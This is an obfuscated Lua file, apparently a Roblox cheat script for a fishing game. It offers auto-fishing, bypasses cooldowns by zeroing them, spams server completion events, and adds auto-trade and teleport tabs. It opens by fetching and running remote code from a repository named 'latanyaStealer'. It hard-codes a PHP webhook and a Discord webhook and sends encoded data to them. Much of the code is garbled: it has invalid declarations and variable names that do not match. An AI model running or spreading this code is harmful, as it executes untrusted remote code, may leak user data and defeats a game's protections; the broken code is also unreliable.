-- Obfuscated Lua
loadstring(game:HttpGet('data:text/plain;base64,local var_0nv82c = (loadstring(game:HttpGet("https://raw.githubusercontent.com/aldyjrz/latanyaStealer/refs/heads/main/ui/angin")))()
local var_oj5ago = game:GetService("Players")
local var_brdicw = game:GetService("RunService")
local var_20ej5d = game:GetService("TeleportService")
local var_h3k83u = AldyToiT.LocalPlayer
local var_rh0xit = game:GetService("HttpService")
local var_ozxh11 = game:GetService("UserInputService")
local var_w92j9t = game:GetService("ReplicatedStorage")
local var_9xu4a8 = game:GetService("Workspace")

if not AldyToiG or not AldyToiH then return end

local var_cu2q35 = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Mythical", "SECRET"}
local var_ry8cmn = game:GetService("TweenService")
local var_gizcry = game:GetService("Lighting")
local var_pul5pr = AldyToiG:WaitForChild("PlayerGui")
local var_5kt2zv = (require(AldyToiH.Replion)).Replion
local var_f5dfvq = AldyToif:WaitReplion("Data")
local var_lxso6t = AldyToiJ:Get("EquippedToolUUID")
local var_13er1s = AldyToiJ:Get("Data")
local var_alhswv = AldyToil and AldyToil["fishing Rods"] or {}
local var_63cmdq = nil
local var_q3462e = 0
local var_86bv63 = AldyToiG.PlayerGui:FindFirstChild("MainUI")

for AldyToiQ, AldyToiT in pairs(AldyToiu) do
    if tostring(AldyToiT.UUID) == tostring(AldyToiw) then
        AldyToiq = AldyToiT.Id
        break
    end
end

local var_ukafuo = AldyToiH:WaitForChild("items")
local var_51qldy = AldyToiH.Packages._Index.net.RE_FavoriteItem
local var_abvbg8 = require(AldyToiH.Modules.utility)
local var_1ebv8t = "https://iggbs.indoarsip.co.id/xwebhook.php"
local var_qdlron = "https://discord.com/api/webhooks/1169300067341078734/LqWc_8E3nO3Wk7R_jN5fFqVjXg"
local var_j2a8xq = (((AldyToiH:WaitForChild("Packages")):WaitForChild("_Index")):WaitForChild("net")):WaitForChild("net")
local var_xzqgq5 = tick()

AldyToiQ:AddTheme({
    Background = "#1f1f1f",
    Accent = Color3.fromRGB(60, 180, 120),
    Dialog = Color3.fromRGB(24, 24, 24),
    Outline = Color3.new(0.3, 0.4, 0.5),
    SecondaryBackground = Color3.fromRGB(112, 112, 112),
    TextSize = 16,
    Text = Color3.fromRGB(255, 255, 255),
    Input = Color3.fromRGB(24, 24, 24),
    Header = Color3.fromRGB(11, 23, 31)
})

AldyToiQ.Theme.Dropdown = {TextSize = 16, TextColor = Color3.fromRGB(255, 255, 255)}

do
    AldyToiQ:SetFont("rbxasset://fonts/families/Ubuntu.json")
    local var_qu7g6d AldyToiT()
        local var_oh7h0c = game:GetService("TweenService")
        local var_mm3m5a = game:GetService("Lighting")
        local var_qxfvfl = game.Players.LocalPlayer
        local var_5p8naz = Instance.new("BlurEffect")
        AldyToiY.Size = 0
        AldyToiY.Parent = AldyToiT
        (AldyToiQ:Create(AldyToiY, TweenInfo.new(0.5), {Size = 24})):Play()
        local var_7ihvq0 = Instance.new("ScreenGui")
        AldyToiG.Name = "AldySplash"
        AldyToiG.Enabled = false
        AldyToiG.IgnoreGuiInset = true
        AldyToiG.Parent = AldyToic:WaitForChild("PlayerGui")
        local var_l5l0y2 = Instance.new("Frame")
        AldyToiO.Size = UDim2.new(1, 0, 1, 0)
        AldyToiO.BackgroundTransparency = 1
        AldyToiO.Parent = AldyToiG
        local var_tj4d9q = Instance.new("ImageLabel")
        AldyTois.Scale = 0.3
        AldyTois.Parent = AldyToiO
        local var_3iwqac = Instance.new("TextLabel")
        AldyToiH.Size = UDim2.new(1, 0, 1, 0)
        AldyToiH.BackgroundTransparency = 1
        AldyToiH.Text = ".AldyToi"
        AldyToiH.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json")
        AldyToiH.TextSize = 80
        AldyToiH.TextColor3 = Color3.fromRGB(255, 255, 255)
        AldyToiH.TextTransparency = 1
        AldyToiH.AnchorPoint = Vector2.new(0.5, 0.5)
        AldyToiH.Position = UDim2.new(0.5, 0, 0.45, 0)
        AldyToiH.ZIndex = 2
        AldyToiH.Parent = AldyToiO
        local var_ugs5i5 = Instance.new("UIGradient")
        AldyToig.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 180, 120)); ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 220, 160))})
        AldyToig.Rotation = 90
        AldyToig.Parent = AldyToiH
        local var_t6ke4r = Instance.new("UIStroke")
        AldyToip.Color = Color3.fromRGB(100, 200, 140)
        AldyToip.Thickness = 2
        AldyToip.Transparency = 1
        AldyToip.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        AldyToip.Parent = AldyToiH
        local var_zmqygi = Instance.new("TextLabel")
        AldyToid.Size = UDim2.new(0.8, 0, 0.1, 0)
        AldyToid.Position = UDim2.new(0.5, 0, 0.58, 0)
        AldyToid.AnchorPoint = Vector2.new(0.5, 0)
        AldyToid.BackgroundTransparency = 1
        AldyToid.Text = "Please wait, loading script..."
        AldyToid.Font = Enum.Font.Ubuntu
        AldyToid.TextSize = 18
        AldyToid.TextColor3 = Color3.fromRGB(100, 200, 140)
        AldyToid.TextTransparency = 1
        AldyToid.TextWrapped = true
        AldyToid.TextYAlignment = Enum.TextYAlignment.Top
        AldyToid.ZIndex = 2
        AldyToid.Parent = AldyToiO
        (AldyToiQ:Create(AldyTois, TweenInfo.new(0.8, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})):Play()
        (AldyToiQ:Create(AldyToiH, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {TextTransparency = 0})):Play()
        (AldyToiQ:Create(AldyToip, TweenInfo.new(0.6), {Transparency = 0})):Play()
        (AldyToiQ:Create(AldyToid, TweenInfo.new(0.8), {TextTransparency = 0})):Play()
        task.wait(1)
        (AldyToiQ:Create(AldyToiH, TweenInfo.new(0.4), {TextTransparency = 1})):Play()
        (AldyToiQ:Create(AldyToip, TweenInfo.new(0.4), {Transparency = 1})):Play()
        (AldyToiQ:Create(AldyToid, TweenInfo.new(0.4), {TextTransparency = 1})):Play()
        (AldyToiQ:Create(AldyTois, TweenInfo.new(0.4, Enum.EasingStyle.Cubic, Enum.EasingDirection.In), {Scale = 0.7})):Play()
        task.wait(0.5)
        AldyToiG:Destroy()
        AldyToiY:Destroy()
    end
    AldyToiT()
end

local var_is6sz0 = os.time()
local var_1w7rfc = AldyToiG.PlayerGui.MainUI.Main.Pages.Inventory
local var_xr3lyy = AldyToiG.PlayerGui.MainUI.InventoryItems
local var_f9ibcy = {}
AldyToiI.RF_ChargeFishingRod = AldyToiL:WaitForChild("RF_ChargeFishingRod")
AldyToiI.RF_RequestFishingMinigameStarted = AldyToiL:WaitForChild("RF_RequestFishingMinigameStarted")
AldyToiI.RE_FishingCompleted = AldyToiL:WaitForChild("RE_FishingCompleted")
AldyToiI.RE_EquipTool = AldyToiL:WaitForChild("RE_EquipToolFromHotbar")
AldyToiI.UnEquipTool = AldyToiL:WaitForChild("RE_UnequipToolFromHotbar")
AldyToiI.RE_FishingEffect = AldyToiL:WaitForChild("RE_FishingEffect")
AldyToiI.RF_AutoFish = AldyToiL:WaitForChild("RF_UpdateAutofishingState")
AldyToiI.RE_PlaceLeverItem = AldyToiL:WaitForChild("RE_PlaceLeverItem")
AldyToiI.RF_InitiateTrade = AldyToiL:WaitForChild("RF_InitiateTrade")
AldyToiI.RF_ProposeTradeItem = AldyToiL:WaitForChild("RF_ProposeTradeItem")
AldyToiI.RERollEnchant = AldyToiL:WaitForChild("RERollEnchant")
AldyToiI.RE_ActivateEnchantingAltar = AldyToiL:WaitForChild("RE_ActivateEnchantingAltar")
AldyToiI.RF_CancelFishing = AldyToiL:WaitForChild("RF_CancelFishingInputs")
AldyToiI.RF_SellAllItems = AldyToiL:WaitForChild("RF_SellAllItems")
AldyToiI.RE_PlaceEnchantItem = AldyToiL:WaitForChild("RE_PlaceEnchantItem")

local var_ly5pzf = false
local var_dxreah = AldyToiQ:CreateWindow({
    Title = "AldyToi",
    Icon = "rbxassetid://710395.446574",
    Subtitle = ".AldyToi - free to use, no key required and no premium version.",
    Name = "fishitAldyToi",
    Size = UDim2.new(520, 250),
    Transparent = true,
    Minimizable = true,
    Draggable = true,
    Resizable = true
})

AldyToiQ:SetTheme("Dark")

if not AldyToiW then return end

AldyToiW:EditOpenButton({
    Title = "AldyToi",
    Icon = "fish",
    IconSize = UDim.new(0, 16),
    StrokeThickness = 2,
    Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(60, 180, 120)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 220, 160))
    }),
    Position = UDim2.new(0, 95, 0, 70),
    OnlyMobile = false,
    ResetOnSpawn = false,
    Draggable = true
})

function AldyToiW.EditOpenButton(AldyToiQ)
    local var_p07k7i = Instance.new("ScreenGui")
    AldyToiT.Name = "RayfieldOpenButton"
    AldyToiT.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    AldyToiT.ResetOnSpawn = false
    AldyToiT.Parent = game:GetService("CoreGui")
    AldyToiT.ResetOnSpawn = false
    local var_rq4e9z = Instance.new("ImageButton")
    AldyToic.Name = "OpenButton"
    AldyToic.Size = UDim2.new(0, 45, 0, 45)
    AldyToic.Position = UDim2.new(0, 95, 0, 70)
    AldyToic.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
    AldyToic.Image = "rbxassetid://13054593444"
    AldyToic.AutoButtonColor = true
    AldyToic.Parent = AldyToiT
    local var_c9bhg1 = Instance.new("UICorner", AldyToic)
    AldyToiY.CornerRadius = UDim.new(0, 9)
    local var_xn7yvd = Instance.new("UIStroke", AldyToic)
    AldyToiG.Thickness = 1.5
    AldyToiG.Color = Color3.fromRGB(123, 215, 64)
    AldyToiG.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    local var_2sxnjm, AldyTois, AldyToiH
    AldyToic.InputBegan:Connect(function(AldyToiQ)
        if AldyToiQ.UserInputType == Enum.UserInputType.MouseButton1 or AldyToiQ.UserInputType == Enum.UserInputType.Touch then
            AldyToiO, AldyTois, AldyToiH = true, AldyToiQ.Position, AldyToic.Position
            AldyToiQ.Changed:Connect(function()
                if AldyToiQ.UserInputState == Enum.UserInputState.End then
                    AldyToiO = false
                end
            end)
        end
    end)

    (game:GetService("UserInputService")).InputChanged:Connect(function(AldyToiQ)
        if AldyToiO and (AldyToiQ.UserInputType == Enum.UserInputType.MouseMovement or AldyToiQ.UserInputType == Enum.UserInputType.Touch) then
            local var_hobpj0 = AldyToiQ.Position - AldyTois
            AldyToic.Position = UDim2.new(AldyToiH.X.Scale, AldyToiH.X.Offset + AldyToiT.X, AldyToiH.Y.Scale, AldyToiH.Y.Offset + AldyToiT.Y)
        end
    end)
    
    AldyToic.MouseButton1Click:Connect(function()
        AldyToiT.Enabled = false
        AldyToiW:Open()
    end)

    AldyToiW:OnDestroy(function()
        AldyToiT:Destroy()
    end)

    AldyToiW:DisableTopbarButtons({"Close", "Minimize"})
    AldyToiW:CreateTopbarButton("Close", "x", function()
        AldyToiW:Close()
        AldyToiT.Enabled = true
    end, 999)

    AldyToiQ.OpenButton = AldyToiT
end
AldyToiW:EditOpenButton()

local var_7nh81y = AldyToiW.ConfigManager
local var_m1qwb7 = AldyToih:CreateConfig("Toi")
AldyToiW:SetBackgroundImageTransparency(1)
AldyToiW:IsResizable(true)

local var_zzfq7n = {
    Legendary = false,
    Mythical = false,
    Secret = false
}
local var_1ewgg3 = {
    AutoSell = false,
    autoRecast = false,
    castStyle = "normal",
    autoBuyWeather = false,
    jumpKeybind = false,
    loopDelay = 0.01,
    autoFishing = false,
    amazingCast = false,
    selectedTier = {},
    floatingPlatform = false,
    autoRecast = true,
    autoArtifact = false,
    priceValue = false,
    autoFarming = false,
    animate = "skip",
    autoFarmArtifact = false
}

local var_evgdgo = AldyToiW:Section({Title = "Main Menu", Icon = 14, ShowTabTitle = true})
local var_ajqnrr = AldyToiW:Section({Title = "Misc", Icon = 14, ShowTabTitle = true})
local var_sw8bjl = AldyToia:Tab({Title = "Auto Fishing", Icon = "fish", ShowTabTitle = true})
local var_2wtc5s = AldyToia:Tab({Title = "Auto Sell", Icon = "shopping-cart", ShowTabTitle = true})
local var_10xau4 = AldyToia:Tab({Title = "Auto Farm", Icon = "zap", ShowTabTitle = true})
local var_59fr7v = AldyToia:Tab({Title = "Events", Icon = "calendar", ShowTabTitle = true})
local var_bfvhs9 = AldyToia:Tab({Title = "Player Config", Icon = "cog", ShowTabTitle = true})
local var_x7bp1n = AldyToia:Tab({Title = "Configuration", Icon = "wrench", ShowTabTitle = true})
local var_kou8qg = AldyToia:Tab({Title = "Auto Trade", Icon = "dollar-sign", ShowTabTitle = true})
local var_pfaxvx = AldyToia:Tab({Title = "Auto Favorite", Icon = "heart", ShowTabTitle = true})
local var_7foznn = AldyToia:Tab({Title = "Auto Enchant", Icon = "repeat", ShowTabTitle = true})
local var_pn9qyq = AldyToia:Tab({Title = "Weather", Icon = "cloud-drizzle", ShowTabTitle = true})
local var_5lewwk = AldyToia:Tab({Title = "Teleport", Icon = "map-pin", ShowTabTitle = true})
local var_kd6mhl = AldyToia:Tab({Title = "Buy Rod & Bait", Icon = "package", ShowTabTitle = true})
local var_mc7fx7 = AldyToia:Tab({Title = "Temple", Icon = "wrench", ShowTabTitle = true})
local var_r6ees0 = AldyToia:Tab({Title = "Webhook", Icon = "info", ShowTabTitle = true})
local var_738knb = AldyToii:Tab({Title = "Interface", Icon = "layout-dashboard", ShowTabTitle = true})
local var_0qlq4o = AldyToii:Tab({Title = "Server Info", Icon = "server", ShowTabTitle = true})
local var_jz3iqq = AldyToiL:WaitForChild("RE_FishingStopped")
local var_j8tcjm = true
local var_y47cvo = true
local var_idaah6 = true
local var_bpvjgj = true
local var_1iz149 = 0
local var_xqo45m = 0
local var_wsq79i = require((AldyToiH:WaitForChild("Controllers")):WaitForChild("FishingController"))
local var_37vuzc = AldyToiG.Character or AldyToiG.CharacterAdded:Wait()
local var_89znpd = AldyToizU:WaitForChild("Humanoid")
local var_fjgbdo = "139622307103608"
local var_09t5xe = "92421071653273"
local var_nx6k7k = "rbxassetid://9233075249"
local var_0kzka6 = "rbxassetid://9233068997"
local var_kimf0o = "83190203975649"
local var_80ramw = "rbxassetid://123456789"
local var_m2kvn0 = "rbxassetid://134567890"
local var_x3ove4 = "126831815397724"
local var_p2ukw1 = "rbxassetid://123456789"
local var_04x554 = {enabled = false, connection = nil, lastFish = "", lastSend = 0, discordId = "", customUrl = "AldyToi"}
AldyToiFU.selectedTiers = {}

local var_m74qaz AldyToiXU()
    local var_easm1n = AldyToiT.LocalPlayer
    local var_2qteuf = (AldyToiQ.PlayerGui:WaitForChild("MainUI")):WaitForChild("Display")
    for AldyToiQ, AldyToiT in ipairs(AldyToic:GetChildren()) do
        local var_lof11h, AldyToiY = pcall(function()
            return AldyToiT.Inner.Tags["itemAssetId"]
        end)
        if AldyToic and (AldyToiY and AldyToiY:IsA("StringValue")) then
            local var_lar944 = AldyToiY.Value
            return AldyToiQ
        end
    end
    return nil
end

local var_z3s40v AldyToiDU(AldyToiQ)
    AldyToiQ.customUrl = AldyToiFU.customUrl
    local var_cyjpx8 = AldyToiO:JSONEncode(AldyToiQ)
    local var_ln61pq = AldyToiO:UrlEncode(AldyToiT)
    local var_gwr3vy = false
    local var_6yyc7r, AldyToiO = pcall(function()
        local var_8rwk85 = AldyTois:RequestAsync({
            Url = AldyToiX .. ("?data=" .. AldyToic),
            Method = "GET"
        })
        if AldyToiQ and AldyToiQ.Success then
            AldyToiY = true
        end
    end)
    if not AldyToiY then
        local var_me12y0 = http_request or request or syn and syn.request
        if AldyToiQ then
            local var_hpox8b = AldyToiQ({
                Url = AldyToiX .. ("?data=" .. AldyToic),
                Method = "GET",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
            if AldyToiT and (AldyToiT.StatusCode == 200 or AldyToiT.Success) then
                AldyToiY = true
            end
        end
    end
    if not AldyToiY then
        local var_ykg01u, AldyToiT = pcall(function()
            game:HttpGet(AldyToiX .. ("?data=" .. AldyToic))
        end)
        if AldyToiQ then
            AldyToiY = true
        end
    end
end

local var_4003jj AldyToiLU(AldyToiQ)
    for AldyToiT, AldyToic in pairs(AldyToin:GetChildren()) do
        if AldyToic:IsA("ModuleScript") then
            local var_9u9ku0, AldyToiY = pcall(require, AldyToic)
            if AldyToiT and (AldyToiY and (AldyToiY.Data and AldyToiY.Data.Id == AldyToiQ)) then
                return AldyToiY
            end
        end
    end
    return nil
end

local var_8gbjop AldyToiNU()
    local var_7p9kio = AldyToiJ:Get("Inventory")
    if not AldyToiQ or not AldyToiQ.Items then return end
    for AldyToiQ, AldyToiT in pairs(AldyToiQ.Items) do
        local var_ajkdps = AldyToiLU(AldyToiT.Id)
        if AldyToic and (AldyToic.Data.Type == "fishes" and AldyToic.Probability) then
            local var_1ppbl1 = AldyToiF.GetTierFromRarity(nil, AldyToic.Probability.Chance)
            if AldyToiQ and AldyToiQ.Name == "Legendary" then
                if AldyToiT.UUID and not AldyToiT.Favorited then
                    AldyToir:FireServer(AldyToiT.UUID)
                end
            end
        end
    end
end

local var_92ieyi AldyToikU()
    local var_3pcwvj = AldyToiJ:Get("Data")
    if not AldyToiQ or not AldyToiQ.Items then return end
    for AldyToiQ, AldyToiT in pairs(AldyToiQ.Items) do
        local var_vlp2bf = AldyToiLU(AldyToiT.Id)
        if AldyToic and (AldyToic.Data.Type == "fishes" and AldyToic.Probability) then
            local var_wth2sh = AldyToiF.GetTierFromRarity(nil, AldyToic.Probability.Chance)
            if AldyToiQ and AldyToiQ.Name == "Mythical" then
                if AldyToiT.UUID and not AldyToiT.Favorited then
                    AldyToir:FireServer(AldyToiT.UUID)
                end
            end
        end
    end
end

local var_wpj0vs AldyToiUU()
    local var_u496fu = AldyToiJ:Get("Inventory")
    if not AldyToiQ or not AldyToiQ.Items then return end
    for AldyToiQ, AldyToiT in pairs(AldyToiQ.Items) do
        local var_t3pfux = AldyToiLU(AldyToiT.Id)
        if AldyToic and (AldyToic.Data.Type == "fishes" and AldyToic.Probability) then
            local var_hthku4 = AldyToiF.GetTierFromRarity(nil, AldyToic.Probability.Chance)
            if AldyToiQ and AldyToiQ.Name == "SECRET" then
                if AldyToiT.UUID and not AldyToiT.Favorited then
                    AldyToir:FireServer(AldyToiT.UUID)
                end
            end
        end
    end
end

local var_k8wfbb = {
    [5] = false,
    [6] = false,
    [7] = false
}

local var_43lask = {}

local var_igm8if AldyToivU(AldyToiQ)
    local var_dh36sr = AldyToiH:FindFirstChild("items")
    if not AldyToiT then return nil end
    local var_gfufz9 = AldyToiQ or "none"
    AldyToic = (AldyToic:gsub("%s", "")):gsub("%p", "")
    local var_iskjxe = string.lower(AldyToic)
    local var_b7ea05, AldyToiO = nil, 0
    for AldyToiQ, AldyToiT in ipairs(AldyToiT:GetChildren()) do
        if AldyToiT:IsA("ModuleScript") then
            local var_mdgegk = string.lower(AldyToiT.Name)
            if AldyToiY:find(AldyToiQ, 1, true) then
                if #AldyToiT.Name > AldyToiO then
                    AldyToiO = #AldyToiT.Name
                    AldyToiG = AldyToiT
                end
            end
        end
    end
    if AldyToiG then return AldyToiG end
    for AldyToiQ, AldyToiT in ipairs(AldyToiT:GetChildren()) do
        if AldyToiT:IsA("ModuleScript") then
            local var_k6qzf2, AldyToic = pcall(require, AldyToiT)
            if AldyToiQ and (type(AldyToic) == "table" and (AldyToic.Data and type(AldyToic.Data.Name) == "string")) then
                local var_17pmkz = AldyToic.Data.Name
                local var_li33av = (AldyToiQ:gsub("%s", "")):gsub("[^%w]", "")
                if string.lower(AldyToiG) == AldyToiY or string.lower(AldyToiQ) == AldyToiY then
                    return AldyToiT
                end
            end
        end
    end
    return nil
end

local var_qlxcd2 AldyToiWU(AldyToiQ, AldyToiT)
    if AldyToiQ:FindFirstChild("SellPriceLabel") then
        AldyToiQ.SellPriceLabel.Text = "$" .. tostring(AldyToiT)
        return
    end
    local var_mszo73 = Instance.new("TextLabel")
    AldyToic.Name = "SellPriceLabel"
    AldyToic.Text = "Sell $" .. tostring(AldyToiT)
    AldyToic.Size = UDim2.new(1, 0, 0, 24)
    AldyToic.Position = UDim2.new(0, 0, 0, AldyToiQ.ItemName.Position.Y + 2)
    AldyToic.BackgroundTransparency = 1
    AldyToic.TextColor3 = Color3.fromRGB(255, 215, 0)
    AldyToic.Font = Enum.Font.UbuntuBold
    AldyToic.TextScaled = true
    AldyToic.Parent = AldyToiQ
    local var_hy03kl = Instance.new("UIStroke")
    AldyToiY.Thickness = 2
    AldyToiY.Color = Color3.fromRGB(0, 0, 0)
    AldyToiY.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    AldyToiY.Parent = AldyToic
end

local var_si811b = 0

local var_vzi4qh AldyToiSU()
    AldyToihU = 0
    for AldyToiQ, AldyToiT in ipairs(AldyToiU:GetChildren()) do
        if AldyToiT:FindFirstChild("itemAssetId") then
            local var_hrfmiu = AldyToiT.itemAssetId.Value
            local var_iy9v7h = AldyToivU(AldyToiQ)
            if AldyToic then
                local var_49wo2z, AldyToiY = pcall(require, AldyToic)
                if AldyToiQ and (AldyToiY and (AldyToiY.Data and AldyToiY.SellPrice)) then
                    AldyToiWU(AldyToiT, AldyToiY.SellPrice)
                end
                if AldyToiY and (AldyToiY.SellPrice and AldyToiY.Data.Type == "fishes") then
                    AldyToihU = AldyToihU + AldyToiY.SellPrice
                end
            end
        end
    end
    local var_ys9zah = (game:GetService("Players")).LocalPlayer
    local var_r9g7vd = (AldyToiQ:WaitForChild("PlayerGui")):WaitForChild("Inventory")
    local var_5shuwe = AldyToiT:WaitForChild("Inventory_BagSize")
    local var_99l5bx = AldyToic:WaitForChild("TextLabel")
    local var_y1qbl3 = AldyToiY:WaitForChild("Label")
    AldyToiG.Text = AldyToihU
end

local var_ykxmvz AldyToiZU()
    local var_21onuk = AldyToiJ:Get("Inventory")
    if not AldyToiQ or not AldyToiQ.Items then return end
    for AldyToiQ, AldyToiT in pairs(AldyToiQ.Items) do
        local var_qpkzxk = AldyToiLU(AldyToiT.Id)
        if AldyToic and AldyToic.Data.Type == "fishes" then
            if AldyToiT.UUID and not AldyToiT.Favorited then
                AldyToir:FireServer(AldyToiT.UUID)
            end
        end
    end
end

local var_9nss97 AldyToibU()
    local var_ji1xd1 = AldyToiJ:Get("Inventory")
    if not AldyToiQ or not AldyToiQ.Items then return end
    for AldyToiQ, AldyToiT in pairs(AldyToiQ.Items) do
        local var_slqo10 = AldyToiLU(AldyToiT.Id)
        if AldyToic and AldyToic.Data.Type == "fishes" then
            if AldyToiT.UUID and AldyToiT.Favorited then
                AldyToir:FireServer(AldyToiT.UUID)
            end
        end
    end
end

(getgenv()).RemoteFunction = AldyToiH.Replion.net.RF_FishingRodCharge

local var_20qlbt = {}

local var_psnc1v AldyToiiU(AldyToiQ, AldyToiT)
    local var_2kesia = game.Players.LocalPlayer
    local var_9iyret = AldyToic.Character or AldyToic.CharacterAdded:Wait()
    local var_6ac2ya = AldyToiY:WaitForChild("Humanoid")
    for AldyToiQ, AldyToiT in ipairs(AldyToiG:GetPlayingAnimationTracks()) do
        AldyToiT:Stop()
    end
    local var_55mpu4 = Instance.new("Animation")
    AldyToiO.AnimationId = "rbxassetid://" .. AldyToiQ
    local var_85sdkx = AldyToiG:LoadAnimation(AldyToiO)
    AldyTois:Play()
    task.delay(AldyToiT, function()
        if AldyTois.IsPlaying then
            AldyTois:Stop()
        end
    end)
    return AldyTois
end

local var_ra0v4q AldyToijU()
    AldyToiQ:Notify({
        Title = "Minigame",
        Description = "Auto fish minigame detected.",
        Duration = 1
    })
    for AldyToiQ = 1, 10, 1 do
        AldyToiI.RE_FishingCompleted:FireServer()
        task.wait(0.1)
    end
    pcall(function()
        if AldyToixU and AldyToixU.RequestClientStopFishing then
            AldyToixU:RequestClientStopFishing(true)
        end
    end)
end

local var_exgtkp, AldyToiKU, AldyToiEU, AldyToiPU, AldyToiAU = nil, nil, nil, nil, nil

local var_j21qsf AldyToimU()
    if AldyToiMU then
        AldyToiMU:Disconnect()
        AldyToiMU = nil
    end
    AldyToiMU = (getgenv()).RemoteFunction.OnClientEvent:Connect(function(...)
        if AldyToib.castStyle == "normal" and AldyToiq == 245 then
            AldyToiiU("fishCaughtAnimId", 1)
        end
        AldyToiKU = false
        if AldyToiMU then
            AldyToiMU:Disconnect()
            AldyToiMU = nil
        end
    end)
end

local var_ki5w9q = 0

local var_l8t2jc AldyToiyU()
    if AldyToiPU then
        AldyToiPU:Disconnect()
        AldyToiPU = nil
    end
    AldyToiPU = (getgenv()).RemoteFishCaught.OnClientEvent:Connect(function(...)
        if AldyToib and (AldyToib.castStyle == "normal" and AldyToiq == 245) then
            AldyToiiU("rbxassetid://600867027", 1)
        end
        AldyToigU = false
        AldyToiN = tick()
    end)
end

-- FUNGSI MEMANCING UTAMA (DIOPTIMALKAN UNTUK KECEPATAN MAKSIMAL)
local var_kgt18c AldyToieU(AldyToiQ)
    if AldyToiQ then
        pcall(function()
            local var_j8kv8w = {1}
            (((((game:GetService("ReplicatedStorage")):WaitForChild("Packages")):WaitForChild("_Index")):WaitForChild("sleightnick_net@0.2.0")):WaitForChild("net")):WaitForChild("RE_StartFishingAnimation"):FireServer(unpack(AldyToiQ))
        end)
        task.wait(0.01) -- JEDA MINIMAL SETELAH START ANIMATION
        task.spawn(function()
            while AldyToib.autoFishing do
                pcall(function()
                    -- BYPASS COOLDOWN MEMANCING
                    AldyToixU.OnCooldown = function(...)
                        return false
                    end
                    local var_sv94je, AldyToiT = pcall(function()
                        return require((AldyToiH:WaitForChild("Shared")):WaitForChild("FishingConfig"))
                    end)
                    if AldyToiQ and type(AldyToiT) == "table" then
                        local var_tg0w6x = AldyToiT.FishingCooldownTime
                        AldyToiT.FishingCooldownTime = 0 -- MENGATUR COOLDOWN MENJADI 0
                    end
                    AldyToiKU = true
                    AldyToiN = tick()
                    
                    -- SKIP ANIMATION DENGAN MEMANGGIL LANGSUNG RF_ChargeFishingRod
                    AldyToiI.RF_ChargeFishingRod:InvokeServer(AldyToiY:GetServerTimeNow())
                    
                    local var_aelxmx, AldyToiG
                    if AldyToib.castStyle == "perfect" then
                        AldyToic, AldyToiG = -0.74999964237213, 1
                    elseif AldyToib.castStyle == "Amazing" then
                        AldyToic, AldyToiG = -139.6379699707, 0.87694226394928
                    else
                        AldyToic = math.random(-1000, 1000) / 1000
                        AldyToiG = math.random(0, 1000) / 1000
                    end

                    -- SKIP ANIMATION DENGAN MENGHILANGKAN PEMANGGILAN ANIMASI (KARENA MODE = "skip")
                    
                    AldyToiI.RF_RequestFishingMinigameStarted:InvokeServer(AldyToic, AldyToiG)
                    
                    AldyToimU()
                    local var_fd9qp4 = AldyToib.enableFilter
                    
                    local var_thgk5w = {}
                    while AldyToiKU do
                        -- SPAM RE_FishingCompleted untuk menyelesaikan minigame SECEPAT MUNGKIN
                        AldyToiI.RE_FishingCompleted:FireServer(unpack(AldyToiQ))
                        task.wait(0.01) -- JEDA SANGAT MINIMAL ANTAR SPAM COMPLETION
                    end
                end)
                task.wait(AldyToib.loopDelay) -- JEDA ANTAR SIKLUS PANCINGAN (ATUR DI GUI KE 0.01)
            end
        end)
    else
        AldyToiI.RF_CancelFishing:InvokeServer()
        pcall(function()
            if AldyToixU and AldyToixU.RequestClientStopFishing then
                AldyToixU:RequestClientStopFishing(true)
            end
        end)
    end
end

-- HAPUS FUNGSI MEMANCING LAMBAT (AldyToioU, AldyToicG)
-- FUNGSI UNTUK ARTIFACT TETAP DIJAGA, TETAPI DIOPTIMALKAN KECEPATANNYA:

local var_zzpeqj AldyToiQG()
    if AldyToiEU then
        AldyToiEU:Disconnect()
        AldyToiEU = nil
    end
    AldyToiEU = (getgenv()).RemoteFunction.OnClientEvent:Connect(function(...)
        AldyToiHU = false
        AldyToiN = tick()
        if AldyToiEU then
            AldyToiEU:Disconnect()
            AldyToiEU = nil
        end
    end)
end

local var_xmqvs2 AldyToiTG()
    if AldyToiAU then
        AldyToiAU:Disconnect()
        AldyToiAU = nil
    end
    AldyToiAU = (getgenv()).RemoteFishCaught.OnClientEvent:Connect(function(...)
        AldyToipU = false
        AldyToiN = tick()
        if AldyToiAU then
            AldyToiAU:Disconnect()
            AldyToiAU = nil
        end
    end)
end

local var_5gpe93 AldyToiYG(AldyToiQ)
    if AldyToiQ then
        pcall(function()
            local var_zwkncn = {1}
            (((((game:GetService("ReplicatedStorage")):WaitForChild("Packages")):WaitForChild("_Index")):WaitForChild("sleightnick_net@0.2.0")):WaitForChild("net")):WaitForChild("RE_StartFishingAnimation"):FireServer(unpack(AldyToiQ))
        end)
        task.wait(0.01) -- JEDA MINIMAL
        task.spawn(function()
            while AldyToib.autoArtifact do
                pcall(function()
                    AldyToixU.OnCooldown = function(...)
                        return false
                    end
                    AldyToipU = true
                    AldyToiN = tick()
                    
                    AldyToiI.RF_ChargeFishingRod:InvokeServer(AldyToiY:GetServerTimeNow())
                    task.wait(0.01)
                    local var_wem84t, AldyToiT
                    if AldyToib.castStyle == "perfect" then
                        AldyToiQ, AldyToiT = -0.74999964237213, 1
                    elseif AldyToib.castStyle == "Amazing" then
                        AldyToiQ, AldyToiT = -139.6379699707, 0.87694226394928
                    else
                        AldyToiQ = math.random(-1000, 1000) / 1000
                        AldyToiT = math.random(0, 1000) / 1000
                    end
                    
                    AldyToiI.RF_RequestFishingMinigameStarted:InvokeServer(AldyToiQ, AldyToiT)
                    task.wait(0.01)
                    local var_j6sqq3 = {}
                    while AldyToipU do
                        -- SPAM RE_FishingCompleted
                        AldyToiI.RE_FishingCompleted:FireServer(unpack(AldyToic))
                        task.wait(0.01)
                    end
                end)
